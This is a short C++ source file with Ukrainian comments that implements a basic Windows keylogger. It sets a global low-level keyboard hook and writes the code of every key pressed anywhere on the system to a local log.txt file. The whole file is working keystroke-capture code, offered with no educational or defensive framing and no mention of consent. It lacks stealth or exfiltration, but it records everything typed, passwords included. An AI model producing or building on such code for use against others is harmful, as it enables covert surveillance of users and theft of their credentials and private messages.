#include <windows.h>
#include <iostream>
#include <fstream>

HHOOK hHook;
std::ofstream logFile;

// Функція обробки подій клавіатури
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            logFile << "Key pressed: " << p->vkCode << std::endl;
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    logFile.open("log.txt");

    if (!logFile.is_open()) {
        std::cout << "Не вдалося відкрити файл!" << std::endl;
        return 1;
    }

    // Встановлення hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (!hHook) {
        std::cout << "Помилка встановлення hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Зняття hook
    UnhookWindowsHookEx(hHook);
    logFile.close();

    return 0;
}